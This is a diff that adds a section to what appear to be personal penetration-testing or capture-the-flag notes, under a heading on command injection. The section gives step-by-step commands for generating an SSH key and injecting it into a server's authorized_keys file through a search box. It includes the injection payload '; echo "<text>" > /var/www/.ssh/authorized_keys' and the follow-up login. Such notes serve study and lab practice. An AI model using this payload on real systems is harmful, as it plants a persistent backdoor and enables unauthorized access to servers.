@@ -370,7 +370,22 @@ Command injection
 ----
 can use search boxes on server sites to run commands that the server should not allow you to run
 
-
+Generating and uploading a public ssh key
+----
+ls -la /var/www
+mkdir /var/www/.ssh (if .ssh does not exist on server)
+rm -rf .ssh (remove ssh keys to generate a new one)
+ssh-keygen -t rsa -b 4096 (generates ssh key)
+id_rsa = private key
+id_rsa.pub = public key
+cat id_rsa.pub 
+GRAB ALL OF THE TEXT AND ADD IT TO A NEW FILE 
+; echo "<text>" > /var/www/.ssh/authorized_keys
+(copy and paste into box on server to gain access)
+Verification
+--
+cat /var/www/.ssh/authorized_keys
+ssh -i id_rsa <username>@<IP> of server that just added workstation to the server
 
 
 
